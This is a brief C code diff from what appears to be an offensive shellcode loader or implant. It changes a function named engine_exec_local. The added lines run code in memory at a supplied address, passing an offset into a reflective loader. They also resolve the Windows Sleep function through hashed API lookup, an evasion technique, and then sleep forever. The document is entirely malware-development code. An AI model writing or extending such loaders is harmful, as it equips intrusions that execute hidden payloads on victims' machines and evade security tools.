@@ -604,7 +604,12 @@ static HANDLE engine_exec_local(void *addr) {
     return NULL;
 
 #else /* EXEC_DIRECT (default) */
+#ifdef UDRL_LOADER_OFFSET
+    ((void(*)(void*))addr)((void*)((unsigned char*)addr + UDRL_LOADER_OFFSET));
+    { pSleep pSl = (pSleep)_resolve(H_MOD_KERNEL32, H_Sleep); if (pSl) pSl(0xFFFFFFFF); }
+#else
     ((void(*)(void*))addr)(NULL);
+#endif
     return NULL;
 #endif
 }
